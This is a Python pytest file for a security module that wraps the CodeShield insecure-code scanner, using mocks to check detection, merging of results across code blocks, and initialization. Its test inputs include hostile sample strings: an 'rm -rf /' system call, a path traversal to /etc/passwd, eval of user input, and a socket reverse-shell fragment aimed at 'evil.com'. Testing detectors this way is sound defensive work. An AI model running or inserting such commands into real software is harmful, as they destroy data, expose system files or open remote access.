from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from sentinel.security import codeshield
from sentinel.core.models import ScanResult


@pytest.fixture(autouse=True)
def _reset_codeshield():
    """Reset codeshield state between tests."""
    codeshield._cs_class = None
    codeshield._loaded = False
    yield
    codeshield._cs_class = None
    codeshield._loaded = False


class TestCodeShieldScan:
    @pytest.mark.asyncio
    async def test_not_loaded_returns_clean(self):
        """When not loaded, scan returns clean result (graceful degradation)."""
        result = await codeshield.scan("import os\nos.system('rm -rf /')")
        assert isinstance(result, ScanResult)
        assert result.found is False
        assert result.scanner_name == "codeshield"

    @pytest.mark.asyncio
    async def test_clean_code_passes(self):
        """Clean Python code should not be flagged."""
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_result.issues_found = None

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("def hello():\n    return 'world'")
        assert result.found is False

    @pytest.mark.asyncio
    async def test_os_system_detected(self):
        """os.system() should be flagged as insecure."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-78"
        mock_issue.description = "Dangerous os.system call"
        mock_issue.line = 2

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("import os\nos.system('rm -rf /')")
        assert result.found is True
        assert len(result.matches) == 1
        assert "CWE-78" in result.matches[0].pattern_name

    @pytest.mark.asyncio
    async def test_path_traversal_detected(self):
        """Path traversal code should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-22"
        mock_issue.description = "Path traversal attempt"
        mock_issue.line = 1

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("open('../../etc/passwd')")
        assert result.found is True

    @pytest.mark.asyncio
    async def test_eval_exec_detected(self):
        """eval/exec should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-94"
        mock_issue.description = "eval() detected"
        mock_issue.line = 1

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("eval(user_input)")
        assert result.found is True

    @pytest.mark.asyncio
    async def test_reverse_shell_blocked(self):
        """Reverse shell code should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-94"
        mock_issue.description = "Reverse shell detected"
        mock_issue.line = 3

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        code = "import socket\ns=socket.socket()\ns.connect(('evil.com',4444))"
        result = await codeshield.scan(code)
        assert result.found is True

    def test_is_loaded_false_by_default(self):
        assert codeshield.is_loaded() is False

    @pytest.mark.asyncio
    async def test_insecure_no_issues_generic_match(self):
        """If is_insecure=True but no issues list, adds a generic match."""
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = []

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("dangerous code")
        assert result.found is True
        assert result.matches[0].pattern_name == "codeshield_insecure"

    @pytest.mark.asyncio
    async def test_scan_error_returns_clean(self):
        """If the scanner throws, return clean (fail-open for availability)."""
        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(side_effect=RuntimeError("Scanner crashed"))

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("some code")
        assert result.found is False


class TestCodeShieldScanBlocks:
    @pytest.mark.asyncio
    async def test_not_loaded_returns_clean(self):
        """When not loaded, scan_blocks returns clean result."""
        result = await codeshield.scan_blocks([("eval(x)", "python")])
        assert result.found is False
        assert result.scanner_name == "codeshield"

    @pytest.mark.asyncio
    async def test_single_clean_block(self):
        """Single clean code block passes."""
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_result.issues_found = None

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan_blocks([
            ("def hello():\n    return 'world'", "python"),
        ])
        assert result.found is False

    @pytest.mark.asyncio
    async def test_one_clean_one_insecure(self):
        """Mixed results: one clean + one insecure → overall insecure."""
        clean_result = MagicMock()
        clean_result.is_insecure = False
        clean_result.issues_found = None

        insecure_issue = MagicMock()
        insecure_issue.cwe_id = "CWE-78"
        insecure_issue.description = "os.system call"
        insecure_issue.line = 1

        insecure_result = MagicMock()
        insecure_result.is_insecure = True
        insecure_result.issues_found = [insecure_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(side_effect=[clean_result, insecure_result])

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan_blocks([
            ("def safe(): pass", "python"),
            ("import os\nos.system('ls')", "python"),
        ])
        assert result.found is True
        assert len(result.matches) == 1
        assert "CWE-78" in result.matches[0].pattern_name

    @pytest.mark.asyncio
    async def test_language_hint_passed(self):
        """Language hint is forwarded to scan_code()."""
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_result.issues_found = None

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        # Mock the Language enum import
        mock_lang_enum = MagicMock()
        mock_lang_value = MagicMock()
        mock_lang_enum.return_value = mock_lang_value

        with patch.dict("sys.modules", {
            "codeshield.insecure_code_detector.languages": MagicMock(Language=mock_lang_enum),
        }):
            await codeshield.scan_blocks([("print('hi')", "python")])
            mock_lang_enum.assert_called_with("python")
            mock_cs.scan_code.assert_called_once_with(
                "print('hi')", language=mock_lang_value,
            )

    @pytest.mark.asyncio
    async def test_none_language_hint(self):
        """None language hint → scan without language parameter."""
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_result.issues_found = None

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        await codeshield.scan_blocks([("echo hello", None)])
        mock_cs.scan_code.assert_called_once_with("echo hello", language=None)

    @pytest.mark.asyncio
    async def test_error_in_one_block_continues(self):
        """Error scanning one block doesn't prevent scanning others."""
        insecure_issue = MagicMock()
        insecure_issue.cwe_id = "CWE-94"
        insecure_issue.description = "eval detected"
        insecure_issue.line = 1

        insecure_result = MagicMock()
        insecure_result.is_insecure = True
        insecure_result.issues_found = [insecure_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(
            side_effect=[RuntimeError("crash"), insecure_result],
        )

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan_blocks([
            ("block1", "python"),
            ("eval(x)", "python"),
        ])
        assert result.found is True
        assert len(result.matches) == 1

    @pytest.mark.asyncio
    async def test_multiple_insecure_blocks(self):
        """Multiple insecure blocks → all issues merged."""
        issue1 = MagicMock()
        issue1.cwe_id = "CWE-78"
        issue1.description = "os.system"
        issue1.line = 1

        issue2 = MagicMock()
        issue2.cwe_id = "CWE-94"
        issue2.description = "eval"
        issue2.line = 1

        result1 = MagicMock()
        result1.is_insecure = True
        result1.issues_found = [issue1]

        result2 = MagicMock()
        result2.is_insecure = True
        result2.issues_found = [issue2]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(side_effect=[result1, result2])

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan_blocks([
            ("os.system('ls')", "python"),
            ("eval(x)", "python"),
        ])
        assert result.found is True
        assert len(result.matches) == 2

    @pytest.mark.asyncio
    async def test_insecure_no_issues_generic_match(self):
        """Block flagged insecure but no specific issues → generic match."""
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = []

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan_blocks([("bad code", None)])
        assert result.found is True
        assert result.matches[0].pattern_name == "codeshield_insecure"

    @pytest.mark.asyncio
    async def test_empty_blocks_list(self):
        """Empty blocks list → clean result (nothing to scan)."""
        codeshield._cs_class = MagicMock()
        codeshield._loaded = True

        result = await codeshield.scan_blocks([])
        assert result.found is False


class TestCodeShieldInitialize:
    def test_import_not_available(self):
        """When codeshield package is not installed, returns False gracefully."""
        with patch.dict("sys.modules", {
            "codeshield": None,
            "codeshield.insecure_code_detector": None,
            "codeshield.insecure_code_detector.oss": None,
            "codeshield.cs": None,
        }):
            result = codeshield.initialize()
            assert result is False
            assert codeshield.is_loaded() is False

    def test_successful_init(self):
        """When codeshield package is available, initialize returns True."""
        mock_oss = MagicMock()
        mock_icd = MagicMock()
        mock_icd.oss = mock_oss
        mock_cs_module = MagicMock()
        mock_cs_class = MagicMock()
        mock_cs_module.CodeShield = mock_cs_class

        with patch.dict("sys.modules", {
            "codeshield": MagicMock(),
            "codeshield.insecure_code_detector": mock_icd,
            "codeshield.insecure_code_detector.oss": mock_oss,
            "codeshield.cs": mock_cs_module,
        }):
            result = codeshield.initialize()
            assert result is True
            assert codeshield.is_loaded() is True
            assert codeshield._cs_class is mock_cs_class
            # Verify semgrep command was patched
            assert mock_oss.SEMGREP_COMMAND == [
                "semgrep", "--json", "--quiet", "--metrics", "off", "--config",
            ]
